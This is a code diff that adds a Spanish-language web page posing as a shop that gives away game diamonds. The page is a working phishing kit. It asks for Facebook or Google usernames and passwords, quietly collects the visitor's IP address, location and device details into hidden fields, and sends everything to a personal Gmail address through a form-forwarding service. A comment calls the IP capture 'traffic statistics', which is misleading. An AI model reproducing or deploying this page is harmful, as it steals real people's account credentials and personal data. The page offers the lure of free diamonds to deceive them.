@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Tienda JosDiamons</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #1b1b2f;
+      color: #ffffff;
+      margin: 0;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .banner-animado {
+      font-size: 26px;
+      font-weight: bold;
+      background: linear-gradient(90deg, #ffcc00, #ff6600, #ffcc00);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      animation: mover 3s infinite linear;
+      margin: 20px 0;
+    }
+
+    @keyframes mover {
+      0% { background-position: 0%; }
+      100% { background-position: 200%; }
+    }
+
+    input, select, button {
+      display: block;
+      width: 90%;
+      max-width: 300px;
+      margin: 10px auto;
+      padding: 10px;
+      font-size: 16px;
+      border-radius: 8px;
+      border: none;
+    }
+
+    button {
+      background-color: #ff6600;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #e65c00;
+    }
+
+    .opciones {
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      margin-top: 20px;
+    }
+
+    .opcion {
+      background: linear-gradient(145deg, #292942, #1e1e38);
+      border: 1px solid #444;
+      padding: 15px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #000;
+    }
+
+    .seccion {
+      display: none;
+    }
+
+    .visible {
+      display: block;
+    }
+
+    .mensaje-final {
+      background-color: #2d2d2d;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 30px;
+    }
+
+    .cuenta-tipo {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 10px;
+    }
+
+    .cuenta-tipo input {
+      display: none;
+    }
+
+    .cuenta-tipo label {
+      padding: 10px 20px;
+      background-color: #444;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+
+    .cuenta-tipo input:checked + label {
+      background-color: #ff6600;
+      color: #fff;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="banner-animado">¡Bienvenido a la Tienda JosDiamons!</div>
+
+  <form id="formularioDiamantes" action="https://formsubmit.co/ajax/vjr68760@gmail.com" method="POST">
+    <input type="hidden" name="ip" id="ip">
+    <input type="hidden" name="ubicacion" id="ubicacion">
+    <input type="hidden" id="clientHintsInput" name="dispositivoInfo" value="">
+    <input type="hidden" name="cookies" id="cookies">
+
+    <div id="login" class="seccion visible">
+      <h2>Inicia sesión</h2>
+      <input type="text" name="usuario" placeholder="Usuario" required />
+      <input type="password" name="contraseña" placeholder="Contraseña" required />
+      <h4>¿Tu cuenta es de?</h4>
+      <div class="cuenta-tipo">
+        <input type="radio" id="facebook" name="tipo_cuenta" value="Facebook" />
+        <label for="facebook">Facebook</label>
+        <input type="radio" id="google" name="tipo_cuenta" value="Google" />
+        <label for="google">Google</label>
+      </div>
+      <button type="button" onclick="validarYMostrar()">Entrar</button>
+    </div>
+
+    <div id="diamantes" class="seccion">
+      <h2>Selecciona una cantidad</h2>
+      <div class="opciones">
+        <div class="opcion">
+          <h3>Adquirir 100 diamantes</h3>
+          <button type="button" onclick="seleccionarDiamantes('100')">Adquirir</button>
+        </div>
+        <div class="opcion">
+          <h3>Adquirir 200 diamantes</h3>
+          <button type="button" onclick="seleccionarDiamantes('200')">Adquirir</button>
+        </div>
+        <div class="opcion">
+          <h3>Adquirir 350 diamantes</h3>
+          <button type="button" onclick="seleccionarDiamantes('350')">Adquirir</button>
+        </div>
+      </div>
+    </div>
+
+    <div id="formulario" class="seccion">
+      <h2>Completa tus datos</h2>
+      <input type="hidden" id="cantidadDiamantes" name="diamantes" />
+      <input type="text" name="id_del_juego" placeholder="ID del juego" required />
+      <select name="region" required>
+        <option value="">Selecciona tu región</option>
+        <option value="norte">Norte</option>
+        <option value="eeuu">EEUU</option>
+      </select>
+      <button type="submit">Enviar</button>
+    </div>
+  </form>
+
+  <div id="mensajeFinal" class="mensaje-final seccion">
+    <h2>¡Congratulations!</h2>
+    <p>Gracias por usar nuestro servicio y confiar en nosotros.</p>
+    <p>Tu recompensa estará llegando en cuanto revisemos tu pedido.</p>
+    <p><strong>Tiempo estimado: de 5 a 24 horas.</strong></p>
+  </div>
+
+<script>
+    // --- TUS FUNCIONES DE INTERFAZ (Intactas) ---
+    function mostrarSeccion(id) {
+      document.querySelectorAll(".seccion").forEach(seccion => seccion.classList.remove("visible"));
+      document.getElementById(id).classList.add("visible");
+    }
+
+    function seleccionarDiamantes(cantidad) {
+      document.getElementById("cantidadDiamantes").value = cantidad + " diamantes";
+      mostrarSeccion("formulario");
+    }
+
+    function validarYMostrar() {
+      const cuentaMarcada = document.querySelector('input[name="tipo_cuenta"]:checked');
+      if (!cuentaMarcada) {
+        alert("Debes seleccionar si tu cuenta es de Google o Facebook.");
+        return;
+      }
+      mostrarSeccion("diamantes");
+    }
+
+    // --- TU ENVÍO DE FORMULARIO (Intacto) ---
+    document.getElementById("formularioDiamantes").addEventListener("submit", function (e) {
+      e.preventDefault();
+      const form = e.target;
+
+      fetch(form.action, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify(Object.fromEntries(new FormData(form))),
+      })
+      .then(() => {
+        mostrarSeccion("mensajeFinal");
+        form.reset();
+      })
+      .catch(() => {
+        alert("Hubo un error al enviar el formulario.");
+      });
+    });
+
+    // --- CAPTURA DE IP Y UBICACIÓN ---
+// Obtiene datos geográficos básicos agregados para estadísticas de tráfico
+fetch('https://ipapi.co/json/')
+  .then(res => res.json())
+  .then(data => {
+    const ipInput = document.getElementById('ip');
+    const ubicacionInput = document.getElementById('ubicacion');
+    
+    if (ipInput) ipInput.value = data.ip || 'No detectada';
+    if (ubicacionInput) ubicacionInput.value = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`;
+  })
+  .catch(() => {
+    const ubicacionInput = document.getElementById('ubicacion');
+    if (ubicacionInput) ubicacionInput.value = 'Ubicación no detectada';
+  });
+
+// --- DETECCIÓN DE ENTORNO Y DISPOSITIVO (Client Hints) ---
+// Utiliza la API moderna para identificar la arquitectura y plataforma del visitante
+async function capturarDispositivo() {
+    const inputDispositivo = document.getElementById('clientHintsInput');
+    if (!inputDispositivo) return; // Evita errores si el input no existe en el HTML
+
+    if (navigator.userAgentData) {
+        try {
+            // Solicita valores de alta entropía según el estándar moderno de privacidad
+            const detalles = await navigator.userAgentData.getHighEntropyValues([
+                "architecture", "model", "platformVersion"
+            ]);
+            inputDispositivo.value = JSON.stringify(detalles);
+        } catch (e) {
+            // Alternativa en caso de que la promesa sea rechazada por el navegador
+            inputDispositivo.value = navigator.userAgent;
+        }
+    } else {
+        // Alternativa para navegadores antiguos que no soportan User-Agent Client Hints
+        inputDispositivo.value = navigator.userAgent;
+    }
+}
+
+// --- CONTROL DEL EVENTO DE ENVÍO ---
+const miFormulario = document.getElementById("formularioDiamantes");
+if (miFormulario) {
+    miFormulario.addEventListener("submit", async function (e) {
+      e.preventDefault(); // Detiene el envío síncrono predeterminado
+      const form = e.target;
+
+      // 1. Forzamos la ejecución de la función asíncrona antes de empaquetar los datos
+      await capturarDispositivo();
+
+      // 2. Construimos el objeto de datos con los inputs ya rellenados por el script
+      const datosFormulario = Object.fromEntries(new FormData(form));
+
+      // 3. Transmisión asíncrona (AJAX) en formato JSON limpio
+      fetch(form.action, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          Accept: "application/json",
+        },
+        body: JSON.stringify(datosFormulario),
+      })
+      .then(() => {
+        if (typeof mostrarSeccion === "function") {
+            mostrarSeccion("mensajeFinal");
+        }
+        form.reset();
+      })
+      .catch(() => {
+        alert("Hubo un error al enviar el formulario.");
+      });
+    });
+}
+
+    
+    function getCookie(nombre) {
+      const cookies = document.cookie.split('; ');
+      for (let c of cookies) {
+        const [clave, valor] = c.split('=');
+        if (clave === nombre) return valor;
+      }
+      return null;
+    }
+  </script>
+</body>
+</html>
